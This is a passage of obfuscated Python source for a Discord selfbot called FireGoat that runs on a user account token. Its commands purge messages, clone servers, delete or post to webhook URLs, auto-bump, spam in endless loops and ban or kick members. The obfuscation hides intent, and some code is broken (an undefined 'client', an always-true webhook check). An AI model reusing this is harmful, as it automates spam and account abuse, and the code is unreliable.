    O0O0OOOO0O0O0OOOO .set_author (name ="selfbot_FireGoat. Server Builder")#line:2216
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate1 |",value ="Tutorial 2")#line:2218
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate2 |",value ="Waz")#line:2220
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate3 |",value ="Sun Flower")#line:2222
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate4 |",value ="Gamer Zone")#line:2224
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate5 |",value ="Baddies")#line:2226
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate6 |",value ="Issa")#line:2228
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate7 |",value ="Drug Cartel")#line:2230
    O0O0OOOO0O0O0OOOO .add_field (name ="| buildtemplate8 |",value ="Everything Anime")#line:2232
    O0O0OOOO0O0O0OOOO .add_field (name ="| How to create | ",value ="Prefix + buildtemplate(number) to create the server")#line:2234
    O0O0OOOO0O0O0OOOO .add_field (name ="|🌀 Credits |",value ="Made by FireGoat")#line:2236
    O0O0OOOO0O0O0OOOO .add_field (name ="|🌀 Website |",value ="||https://shoppy.gg/@Aniell4||")#line:2238
    await O0OO00OO0OO0OOO0O .send (embed =O0O0OOOO0O0O0OOOO )#line:2240
@FireGoat .command ()#line:2250
async def purge (O00O0O00O0OOO0000 ,OOO000OO0OOO000O0 :int ):#line:2252
    await O00O0O00O0OOO0000 .message .delete ()#line:2254
    async for O00000000O0O0O00O in O00O0O00O0OOO0000 .message .channel .history (limit =OOO000OO0OOO000O0 ).filter (lambda O0O000000000OO000 :O0O000000000OO000 .author ==FireGoat .user ).map (lambda OOO0OO000000OOO0O :OOO0OO000000OOO0O ):#line:2256
        try :#line:2258
            await O00000000O0O0O00O .delete ()#line:2260
        except :#line:2262
            pass #line:2264
@FireGoat .command (aliases =["guildinfo"])#line:2268
async def serverinfo (OOOOO0O0OO0O00OOO ):#line:2270
    await OOOOO0O0OO0O00OOO .message .delete ()#line:2272
    OO00OOO0O0OO00O0O ="%a, %d %b %Y %I:%M %p"#line:2274
    O0OOOO000O0000O00 =discord .Embed (title =f"{OOOOO0O0OO0O00OOO.guild.name}",description =f"{len(OOOOO0O0OO0O00OOO.guild.members)} Members\n {len(OOOOO0O0OO0O00OOO.guild.roles)} Roles\n {len(OOOOO0O0OO0O00OOO.guild.text_channels)} Text-Channels\n {len(OOOOO0O0OO0O00OOO.guild.voice_channels)} Voice-Channels\n {len(OOOOO0O0OO0O00OOO.guild.categories)} Categories",timestamp =datetime .datetime .utcnow (),color =discord .Color .blue ())#line:2280
    O0OOOO000O0000O00 .add_field (name ="Server created at",value =f"{OOOOO0O0OO0O00OOO.guild.created_at.strftime(OO00OOO0O0OO00O0O)}")#line:2282
    O0OOOO000O0000O00 .add_field (name ="Server Owner",value =f"{OOOOO0O0OO0O00OOO.guild.owner}")#line:2284
    O0OOOO000O0000O00 .add_field (name ="Server Region",value =f"{OOOOO0O0OO0O00OOO.guild.region}")#line:2286
    O0OOOO000O0000O00 .add_field (name ="Server ID",value =f"{OOOOO0O0OO0O00OOO.guild.id}")#line:2288
    O0OOOO000O0000O00 .set_thumbnail (url =f"{OOOOO0O0OO0O00OOO.guild.icon_url}")#line:2290
    await OOOOO0O0OO0O00OOO .send (embed =O0OOOO000O0000O00 )#line:2292
@FireGoat .command ()#line:2298
async def ping (O0OO0OO000O00OOOO ):#line:2300
    await O0OO0OO000O00OOOO .message .delete ()#line:2302
    OOO0OOO0OO0OOOOO0 =time .monotonic ()#line:2304
    OO0OOO0O0O0OO00O0 =await O0OO0OO000O00OOOO .send ("Pinging...")#line:2306
    OOOOOOO00O0O0O0OO =(time .monotonic ()-OOO0OOO0OO0OOOOO0 )*1000 #line:2308
    await OO0OOO0O0O0OO00O0 .edit (content =f"`{int(OOOOOOO00O0O0O0OO)} ms`")#line:2310
@FireGoat .command ()#line:2314
async def guildicon (O0OOO00OO0OO0000O ):#line:2316
    O0O0O00O00000O000 =discord .Embed (color =RandomColor ())#line:2318
    O0O0O00O00000O000 .set_author (name =O0OOO00OO0OO0000O .guild .name ,icon_url =O0OOO00OO0OO0000O .guild .icon_url )#line:2320
    O0O0O00O00000O000 .set_image (url =O0OOO00OO0OO0000O .guild .icon_url )#line:2322
    await O0OOO00OO0OO0000O .message .delete ()#line:2324
    await O0OOO00OO0OO0000O .send (embed =O0O0O00O00000O000 )#line:2326
@FireGoat .command ()#line:2330
async def av (O0OOO00OO0O0O000O ,OOO0OO0OOOOOO00O0 :discord .Member =None ):#line:2332
    if OOO0OO0OOOOOO00O0 is None :#line:2334
        OOO0OO0OOOOOO00O0 =O0OOO00OO0O0O000O .author #line:2336
    OO0OOOOOOOO00OO00 =discord .Embed (color =RandomColor ())#line:2338
    OO0OOOOOOOO00OO00 .set_author (name =str (OOO0OO0OOOOOO00O0 ),icon_url =OOO0OO0OOOOOO00O0 .avatar_url )#line:2340
    OO0OOOOOOOO00OO00 .set_image (url =OOO0OO0OOOOOO00O0 .avatar_url )#line:2342
    await O0OOO00OO0O0O000O .message .delete ()#line:2344
    await O0OOO00OO0O0O000O .send (embed =OO0OOOOOOOO00OO00 )#line:2346
@FireGoat .command ()#line:2350
async def copy (O0O0O0O0OO0O000OO ):#line:2352
    await O0O0O0O0OO0O000OO .message .delete ()#line:2354
    await FireGoat .create_guild (f"{O0O0O0O0OO0O000OO.guild.name} Copy")#line:2356
    await asyncio .sleep (4 )#line:2358
    for O0OO0O0O0O0O000OO in FireGoat .guilds :#line:2360
        if f"{O0O0O0O0OO0O000OO.guild.name} Copy"in O0OO0O0O0O0O000OO .name :#line:2362
            for OOOOO0000OO00000O in O0OO0O0O0O0O000OO .channels :#line:2364
                await OOOOO0000OO00000O .delete ()#line:2366
            for O000OO000O0O0OO00 in O0O0O0O0OO0O000OO .guild .categories :#line:2368
                O0O0OO0O00OOOO00O =await O0OO0O0O0O0O000OO .create_category (f"{O000OO000O0O0OO00.name}")#line:2370
                for OOO00O00OO000OO0O in O000OO000O0O0OO00 .channels :#line:2372
                    if isinstance (OOO00O00OO000OO0O ,discord .VoiceChannel ):#line:2374
                        await O0O0OO0O00OOOO00O .create_voice_channel (f"{OOO00O00OO000OO0O}")#line:2376
                    if isinstance (OOO00O00OO000OO0O ,discord .TextChannel ):#line:2378
                        await O0O0OO0O00OOOO00O .create_text_channel (f"{OOO00O00OO000OO0O}")#line:2380
@FireGoat .command ()#line:2384
async def clear (OOO0O000OO00O0OO0 ):#line:2386
    await OOO0O000OO00O0OO0 .message .delete ()#line:2388
    os .system ("cls")#line:2390
    ready ()#line:2392
@FireGoat .command ()#line:2395
async def delhook (OO0O00O000OOOO00O ,O000000O0000O0OOO :str ):#line:2396
    await OO0O00O000OOOO00O .message .delete ()#line:2397
    if not O000000O0000O0OOO :#line:2398
        return #line:2399
    else :#line:2400
        OO0O0000O0000O0O0 =requests .delete (O000000O0000O0OOO )#line:2401
        if (OO0O0000O0000O0O0 .status_code ==204 ):#line:2402
            await OO0O00O000OOOO00O .send ('webhook eliminato con successo')#line:2403
        else :#line:2404
            await OO0O00O000OOOO00O .send ('eliminazione del webhook non riuscita')#line:2405
@FireGoat .command ()#line:2409
async def bump (OOO000O00O0OO000O ):#line:2410
    await OOO000O00O0OO000O .message .delete ()#line:2411
    await OOO000O00O0OO000O .send ("Starting..",delete_after =3 )#line:2412
    while True :#line:2413
        try :#line:2414
            await OOO000O00O0OO000O .send ('!d bump')#line:2415
            await asyncio .sleep (7200 )#line:2416
        except Exception as OO00000OOOOO0O00O :#line:2417
            print (f"Couldn't bump. Did the channel get nuked or deleted? Error: {OO00000OOOOO0O00O}")#line:2418
@FireGoat .command ()#line:2421
async def hooksend (OOOO00O000O0000OO ,OO0O0OOOOOOOOOO0O ,*,message ):#line:2422
    await OOOO00O000O0000OO .message .delete ()#line:2423
    _OO0000O0000OOO00O ={"content":message }#line:2424
    requests .post (OO0O0OOOOOOOOOO0O ,json =_OO0000O0000OOO00O )#line:2425
    O00O0000O00O0000O =requests .get (OO0O0OOOOOOOOOO0O ).json ()#line:2426
    if "Unknown Webhook"or "Invalid"in O00O0000O00O0000O ["message"]:#line:2427
        await OOOO00O000O0000OO .send ('Webhook is not valid.',delete_after =2 )#line:2428
    else :#line:2429
        await OOOO00O000O0000OO .send (f'Successfully sent `{message}` to webhook `{OO0O0OOOOOOOOOO0O}`',delete_after =2 )#line:2430
@FireGoat .command ()#line:2433
async def embed (O0OO00OOO000OOOOO ,*,message ):#line:2434
    await O0OO00OOO000OOOOO .message .delete ()#line:2435
    O0OOOOOOOO0O0O0OO =discord .Embed (color =0xFFFAFA ,description =message ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2437
    O0OOOOOOOO0O0O0OO .set_author (name =str (client .user .display_name +"#"+client .user .discriminator ),icon_url =client .user .avatar_url )#line:2439
    await O0OO00OOO000OOOOO .send (embed =O0OOOOOOOO0O0O0OO )#line:2440
@FireGoat .command ()#line:2444
async def tickle (OOOOO00O00000OO00 ,OO00O0O00000OOO0O :discord .Member =None ):#line:2445
    await OOOOO00O00000OO00 .message .delete ()#line:2446
    O00O00O00000O0O0O =requests .get ('https://nekos.life/api/v2/img/tickle').json ()#line:2447
    O00OO0O00OO00OOO0 =discord .Embed (description =f"{client.user.mention} tickles {OO00O0O00000OOO0O.mention}",color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2449
    O00OO0O00OO00OOO0 .set_image (url =O00O00O00000O0O0O ['url'])#line:2450
    await OOOOO00O00000OO00 .send (embed =O00OO0O00OO00OOO0 )#line:2451
@FireGoat .command ()#line:2454
async def spank (O000000O00O0O000O ,O00000O0OO00OO000 :discord .Member =None ):#line:2455
    await O000000O00O0O000O .message .delete ()#line:2456
    O0000OOO0000OO000 =requests .get ('https://nekos.life/api/v2/img/spank').json ()#line:2457
    OO00O0O0OO0OOOO00 =discord .Embed (description =f"{client.user.mention} spanks {O00000O0OO00OO000.mention}",color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2459
    OO00O0O0OO0OOOO00 .set_image (url =O0000OOO0000OO000 ['url'])#line:2460
    await O000000O00O0O000O .send (embed =OO00O0O0OO0OOOO00 )#line:2461
@FireGoat .command ()#line:2464
async def poll (O0O000O00O0O0000O ,*,message ):#line:2465
    await O0O000O00O0O0000O .message .delete ()#line:2466
    OOO0O00O0O00O0000 =discord .Embed (title ="**Poll**",color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2467
    OOO0O00O0O00O0000 .add_field (name =f"{message}",value ="✅ ❌",inline =False )#line:2468
    message =await O0O000O00O0O0000O .send (embed =OOO0O00O0O00O0000 ,delete_after =250 )#line:2469
    await message .add_reaction ("✅")#line:2470
    await message .add_reaction ("❌")#line:2471
@FireGoat .command ()#line:2473
async def tweet (OOO00O00OO000OOOO ,OOOO00O000OOO0O0O ,*,message ):#line:2474
    await OOO00O00OO000OOOO .message .delete ()#line:2475
    OO000OOOOO00000O0 =requests .get (f'https://nekobot.xyz/api/imagegen?type=tweet&username={OOOO00O000OOO0O0O}&text={message}').json ()#line:2476
    O0OO0O0OOOO0OO0O0 =discord .Embed (color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2477
    O0OO0O0OOOO0OO0O0 .set_image (url =OO000OOOOO00000O0 ["message"])#line:2478
    await OOO00O00OO000OOOO .send (embed =O0OO0O0OOOO0OO0O0 )#line:2479
@FireGoat .command ()#line:2483
async def phcomment (OOOOO0OOOOOOO0O00 ,O00OOO0O000OO0O00 ,*,message ):#line:2484
    await OOOOO0OOOOOOO0O00 .message .delete ()#line:2485
    OO0O0O00OOOOOO000 =requests .get (f'https://nekobot.xyz/api/imagegen?type=phcomment&text={message}&username={O00OOO0O000OO0O00}&image=https://i.imgur.com/raRKTgZ.jpg').json ()#line:2487
    OOO00OOOO0O00OO0O =discord .Embed (color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2488
    OOO00OOOO0O00OO0O .set_image (url =OO0O0O00OOOOOO000 ["message"])#line:2489
    await OOOOO0OOOOOOO0O00 .send (embed =OOO00OOOO0O00OO0O )#line:2490
@FireGoat .command ()#line:2493
async def trumptweet (O0O0O0O0OO0OOOO0O ,*,message ):#line:2494
    await O0O0O0O0OO0OOOO0O .message .delete ()#line:2495
    OOOO0OOOOOO000O0O =requests .get (f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}').json ()#line:2496
    O0OO00O00O0OO0OOO =discord .Embed (color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2497
    O0OO00O00O0OO0OOO .set_image (url =OOOO0OOOOOO000O0O ["message"])#line:2498
    await O0O0O0O0OO0OOOO0O .send (embed =O0OO00O00O0OO0OOO )#line:2499
@FireGoat .command ()#line:2502
async def clyde (OOO000O0OOOO00O00 ,*,message ):#line:2503
    await OOO000O0OOOO00O00 .message .delete ()#line:2504
    O00O00OOOO0O00O0O =requests .get (f'https://nekobot.xyz/api/imagegen?type=clyde&text={message}').json ()#line:2505
    OO0O0OOO000O0OO00 =discord .Embed (color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2506
    OO0O0OOO000O0OO00 .set_image (url =O00O00OOOO0O00O0O ["message"])#line:2507
    await OOO000O0OOOO00O00 .send (embed =OO0O0OOO000O0OO00 )#line:2508
@FireGoat .command ()#line:2511
async def dynofarm (O000OOO00O00OO00O ):#line:2512
    while True :#line:2513
        await O000OOO00O00OO00O .send (str (os .urandom (1 )))#line:2514
        await asyncio .sleep (50 )#line:2515
@FireGoat .command ()#line:2519
async def typing (OO0OO0O00OO0O0OOO ):#line:2520
    await OO0OO0O00OO0O0OOO .message .delete ()#line:2521
    while True :#line:2522
        await OO0OO0O00OO0O0OOO .channel .trigger_typing ()#line:2523
        await asyncio .sleep (10 )#line:2524
@FireGoat .command ()#line:2528
async def ban (OO0O0O00O000OO0OO ,OO0OO00OO00OO0OOO :discord .Member =None ,*,reason ):#line:2529
    await OO0O0O00O000OO0OO .message .delete ()#line:2530
    if not OO0OO00OO00OO0OOO :#line:2531
        return #line:2532
    else :#line:2533
        try :#line:2534
            await OO0OO00OO00OO0OOO .ban (reason =reason )#line:2535
            O0O0O000O0O0OO0OO =discord .Embed (description =f'{OO0OO00OO00OO0OOO.display_name}#{OO0OO00OO00OO0OOO.discriminator} was banned for the reason: {reason}',color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2538
            await OO0O0O00O000OO0OO .send (embed =O0O0O000O0O0OO0OO )#line:2539
        except :#line:2540
            pass #line:2541
@FireGoat .command ()#line:2544
async def kick (OO0OO0OOO0OOOO0OO ,O000OO0OO0O0OO000 :discord .Member =None ,*,reason ):#line:2545
    await OO0OO0OOO0OOOO0OO .message .delete ()#line:2546
    if not O000OO0OO0O0OO000 :#line:2547
        return #line:2548
    else :#line:2549
        try :#line:2550
            await O000OO0OO0O0OO000 .kick (reason =reason )#line:2551
            OO00OOOOOO000O0OO =discord .Embed (description =f'{O000OO0OO0O0OO000.display_name}#{O000OO0OO0O0OO000.discriminator} was kicked for the reason: {reason}',color =0xFFFAFA ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2554
            await OO0OO0OOO0OOOO0OO .send (embed =OO00OOOOOO000O0OO )#line:2555
        except :#line:2556
            pass #line:2557
@FireGoat .command ()#line:2560
async def rembed (OO0O0OOO0OOO0O0OO ,*,message ):#line:2561
    await OO0O0OOO0OOO0O0OO .message .delete ()#line:2562
    O00O00OO00OOOOO00 =discord .Embed (description =message ,color =0x9400D3 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2564
    O0OO000OOO0OO000O =discord .Embed (description =message ,color =0x4B0082 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2566
    OO00O0O00OOO000O0 =discord .Embed (description =message ,color =0x0000FF ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2568
    OO00OOOOO0OOO0OOO =discord .Embed (description =message ,color =0x00FF00 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2570
    OO0O0O00OOOO0O000 =discord .Embed (description =message ,color =0xFFFF00 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2572
    OO0O0OOOOO0O00000 =discord .Embed (description =message ,color =0xFF7F00 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2574
    OO0OOOO0OO0OO0000 =discord .Embed (description =message ,color =0xFF0000 ,timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:2576
    OOOO0OO00O00OO00O =await OO0O0OOO0OOO0O0OO .send (embed =O00O00OO00OOOOO00 )#line:2577
    for OOO0O00O0O00000OO in range (2 ):#line:2578
        await asyncio .sleep (0.2 )#line:2579
        await OOOO0OO00O00OO00O .edit (embed =O0OO000OOO0OO000O )#line:2580
        await asyncio .sleep (0.2 )#line:2581
        await OOOO0OO00O00OO00O .edit (embed =OO00O0O00OOO000O0 )#line:2582
        await asyncio .sleep (0.2 )#line:2583
        await OOOO0OO00O00OO00O .edit (embed =OO00OOOOO0OOO0OOO )#line:2584
        await asyncio .sleep (0.2 )#line:2585
        await OOOO0OO00O00OO00O .edit (embed =OO0O0O00OOOO0O000 )#line:2586
        await asyncio .sleep (0.2 )#line:2587
        await OOOO0OO00O00OO00O .edit (embed =OO0O0OOOOO0O00000 )#line:2588
        await asyncio .sleep (0.2 )#line:2589
        await OOOO0OO00O00OO00O .edit (embed =OO0OOOO0OO0OO0000 )#line:2590
        await asyncio .sleep (0.2 )#line:2591
    await OOOO0OO00O00OO00O .delete ()#line:2592
@FireGoat .command ()#line:2596
async def hastebin (OOO0O0O0O00O0O00O ,*,message ):#line:2597
    await OOO0O0O0O00O0O00O .message .delete ()#line:2598
    OO00O0O0O00OOOOOO =requests .post ('https://hastebin.com/documents',data =message ).json ()#line:2599
    await OOO0O0O0O00O0O00O .send (f'https://hastebin.com/{OO00O0O0O00OOOOOO["key"]}')#line:2600
FireGoat .run (TOKEN ,bot =False ,reconnect =True )